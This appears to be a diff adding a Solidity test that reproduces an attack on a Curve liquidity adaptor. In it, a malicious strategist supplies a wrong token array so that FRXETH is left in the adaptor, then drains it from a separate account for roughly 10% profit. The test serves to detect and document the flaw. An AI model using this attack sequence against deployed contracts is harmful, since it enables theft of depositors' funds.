@@ -1839,6 +1839,89 @@ contract CurveAdaptorTest is MainnetStarterTest, AdaptorHelperFunctions {
         cellar.deposit(assets, address(this));
     }
 
+    // ========================================= Attacker Tests =========================================
+
+    function testMaliciousStrategistUsingWrongCoinsArray() external {
+        // Make a large deposit into Cellar, so we dont trip rebalance deviation.
+        uint256 assets = 1_000_000e6;
+        deal(address(USDC), address(this), assets);
+        cellar.deposit(assets, address(this));
+        uint256 startingUsdcBalance = USDC.balanceOf(address(cellar));
+
+        // Simulate Cellar adding 100 USDC worth of value to ETH FRXETH Pool.
+        uint256 valueInLp = priceRouter.getValue(USDC, 100e6, ERC20(EthFrxethToken));
+        deal(address(USDC), address(cellar), startingUsdcBalance - 100e6);
+        deal(EthFrxethToken, address(cellar), valueInLp);
+
+        Cellar.AdaptorCall[] memory data = new Cellar.AdaptorCall[](1);
+
+        ERC20[] memory underlyingTokens = new ERC20[](2);
+        underlyingTokens[0] = ERC20(curveAdaptor.CURVE_ETH());
+        // Malicious strategist intentionally sets coins[1] to be USDC when it should be FRXETH.
+        underlyingTokens[1] = USDC;
+        uint256[] memory orderedTokenAmountsOut = new uint256[](2);
+
+        bytes[] memory adaptorCalls = new bytes[](1);
+        adaptorCalls[0] = _createBytesDataToRemoveETHLiquidityFromCurve(
+            EthFrxethPool,
+            ERC20(EthFrxethToken),
+            valueInLp,
+            underlyingTokens,
+            orderedTokenAmountsOut,
+            false,
+            EthFrxethGauge,
+            bytes4(keccak256(abi.encodePacked("price_oracle()")))
+        );
+        data[0] = Cellar.AdaptorCall({ adaptor: address(curveAdaptor), callData: adaptorCalls });
+
+        // A normal liquidity redemption would give about $33 ETH and $66 FRXETH.
+
+        // Before making call, strategist sends 65 USDC worth of value of ETH to Curve Adaptor, and 1 wei USDC.
+        uint256 valueStrategistAdded = 57e6;
+        uint256 ethValue = priceRouter.getValue(USDC, valueStrategistAdded, WETH);
+        deal(address(curveAdaptor), ethValue);
+        deal(address(USDC), address(curveAdaptor), 1);
+
+        // Strategist rebalances but sandwiches their TXs around it.
+        cellar.callOnAdaptor(data);
+
+        // FRXETH should have been left behind in the adaptor.
+        uint256 frxEthInAdaptor = FRXETH.balanceOf(address(curveAdaptor));
+        uint256 valueLeftInAdaptor = priceRouter.getValue(FRXETH, frxEthInAdaptor, USDC);
+        assertApproxEqRel(valueLeftInAdaptor, 66e6, 0.01e18, "Curve Adaptor should have ~$66 of FRXETH in it.");
+
+        // Strategist from their EOA interacts with Curve Adaptor to get FRXETH sitting in Adaptor.
+        address strategistEoa = vm.addr(0xDEAD1);
+        vm.startPrank(strategistEoa);
+        // Strategist previsouly added liquidity to ETH FrxETH pool.
+        deal(EthFrxethToken, strategistEoa, valueInLp);
+        // Stratestgist properly sets token array.
+        underlyingTokens[1] = FRXETH;
+
+        ERC20(EthFrxethToken).approve(address(curveAdaptor), valueInLp);
+        curveAdaptor.removeLiquidityETHViaProxy(
+            EthFrxethPool,
+            ERC20(EthFrxethToken),
+            valueInLp,
+            underlyingTokens,
+            orderedTokenAmountsOut,
+            false
+        );
+        vm.stopPrank();
+        uint256[] memory balances = new uint256[](2);
+        balances[0] = WETH.balanceOf(strategistEoa);
+        balances[1] = FRXETH.balanceOf(strategistEoa);
+        underlyingTokens[0] = WETH;
+        uint256 valueStrategistHolds = priceRouter.getValues(underlyingTokens, balances, USDC);
+        uint256 attackProfit = valueStrategistHolds - (valueStrategistAdded + 100e6);
+        assertApproxEqRel(
+            attackProfit,
+            10e6,
+            0.05e18,
+            "Attack should have profitted ~valueInLp * allowed slippage(10%)."
+        );
+    }
+
     // ========================================= Helpers =========================================
 
     // NOTE Some curve pools use 2 to indicate locked, and 3 to indicate unlocked, others use 1, and 0 respectively
